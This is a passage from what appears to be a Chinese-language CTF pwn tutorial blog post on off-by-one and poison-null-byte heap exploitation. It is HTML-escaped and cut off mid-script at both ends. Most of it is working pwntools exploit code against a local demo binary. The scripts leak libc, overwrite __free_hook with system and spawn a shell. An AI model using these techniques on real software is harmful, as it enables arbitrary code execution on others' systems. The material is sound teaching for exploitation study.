class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5.exit&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;alloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;+p8(&lt;span class=&#34;number&#34;&gt;0x51&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x448&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xa0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_libc = u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;\x00&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = leak_libc - &lt;span class=&#34;number&#34;&gt;0x3ebca0&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;# main+96和libc起始位置偏移&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(leak_libc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x448&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x418&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;)+p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





&lt;h1 id=&#34;利用3-收缩被释放块-poison-null-byte&#34;&gt;&lt;a href=&#34;#利用3-收缩被释放块-poison-null-byte&#34; class=&#34;headerlink&#34; title=&#34;利用3: 收缩被释放块 poison null byte&#34;&gt;&lt;/a&gt;利用3: 收缩被释放块 poison null byte&lt;/h1&gt;&lt;p&gt;​	权威指南里面的图,还不错&lt;/p&gt;
&lt;p&gt;​	总的俩说还是造成堆块重叠&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155836221.png&#34; alt=&#34;image-20230603155836221&#34;&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155842598.png&#34; alt=&#34;image-20230603155842598&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		博主的图,也不错,不过最后好像少了一块,进行了补全&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/2&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531202728221.png&#34; alt=&#34;image-20230531202728221&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;free 5之前&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203121300.png&#34; alt=&#34;image-20230531203121300&#34;&gt;&lt;/p&gt;
&lt;p&gt;free之后tcachebin 0x50多了一项,此时利用edit修改fd,就可以实现任意地址写&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203247741.png&#34; alt=&#34;image-20230531203247741&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改fd后,此时就可以修改hook指针getshell&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203452499.png&#34; alt=&#34;image-20230531203452499&#34;&gt;&lt;/p&gt;
&lt;p&gt;exp&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level = &lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./demo&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc = ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;a&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5.exit&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(a))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;alloc&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;edit&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index,size,content&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;size&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.send(content)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;free&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    cmd(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;index:\n&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;c&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;d&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0xf0&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#这里写一个0x100是为了绕过检查，因为之前的0x111被改成了0x100&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#ptmalloc会根据nextchunk的prev_size字段检查是否大小匹配。这里写入0x100的地方正好是利用off-by-null漏洞后nextchunk的prev_size字段。&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alloc(i,&lt;span class=&#34;number&#34;&gt;0x108&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;p&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;9&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# tcache填充 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x19&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;A&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x18&lt;/span&gt; + p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span 